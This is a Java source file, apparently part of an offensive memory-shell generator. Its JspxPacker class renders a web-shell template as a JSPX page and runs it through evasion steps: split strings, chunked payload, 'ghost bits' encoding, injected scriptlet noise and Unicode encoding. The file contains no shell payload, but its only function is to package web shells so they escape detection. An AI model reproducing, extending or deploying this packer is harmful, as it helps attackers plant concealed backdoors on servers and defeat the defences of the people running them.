package org.leo.jmg.mem.packer.jsp;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.TemplateRenderer;
import org.leo.jmg.mem.packer.Util;

@PackerMeta(
    name = "JSPX", group = "Jsp", order = 5,
    obfuscationSteps = {
        "SPLIT_STRING_LITERALS",
        "CHUNK_PAYLOAD",
        "GHOST_BITS_ENCODE",
        "INJECT_SCRIPTLET_NOISE",
        "UNICODE_ENCODE_JSPX"
    }
)
public class JspxPacker implements Packer {

    private final String jspxTemplate = Util.loadTemplateFromResource("/memshell-template/shell.jspx");

    @Override
    public String pack(ClassPackerConfig config) {
        // TemplateRenderer 在渲染阶段完成变量名/类名随机化，无需 RANDOMIZE_VAR_NAMES 步骤
        String code = TemplateRenderer.render(jspxTemplate, config);
        JspObfuscationPipeline pipeline = (config.getJspObfuscationSteps() != null)
                ? JspObfuscationPipeline.fromStepIds(config.getJspObfuscationSteps())
                : JspObfuscationPipeline.jspxDefault();
        return pipeline.apply(code);
    }
}
